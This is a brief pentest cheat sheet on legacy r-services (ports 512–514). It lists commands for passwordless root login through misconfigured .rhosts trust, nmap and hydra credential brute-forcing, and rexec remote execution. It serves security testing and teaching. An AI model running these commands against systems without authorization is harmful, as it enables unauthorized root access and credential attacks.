# R-Services (512–514)

!!! tip "Start here"
    Try passwordless rlogin immediately: `rlogin -l root $IP`. If `.rhosts` contains `+ +` or trusts your source IP, you get a shell with no credentials. Also test `rsh -l root $IP id`. These services are rare but almost always misconfigured when present.

---

## Enumeration

```bash
nmap -p 512-514 --script rexec-brute,rsh-brute,rlogin-brute $IP
```

---

## Trust-Based Access (rlogin / rsh)

```bash
rlogin -l root $IP
rsh -l root $IP id
rsh -l root $IP
```

Authentication relies on `/etc/hosts.equiv` and `~/.rhosts`. If either contains `+ +`, any host can authenticate as any user.

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rexec://$IP
hydra -L users.txt -P passwords.txt rlogin://$IP
```

---

## Remote Execution (rexec)

```bash
rexec $IP -l <user> -p <pass> "id"
```

!!! tip "Real-world"
    R-services predate SSH and have no encryption, all traffic including credentials is cleartext. They're nearly extinct on modern systems but occasionally show up on legacy Unix hosts, embedded devices, or old network appliances. When you find them, trust-based access is the first thing to check before touching brute force.
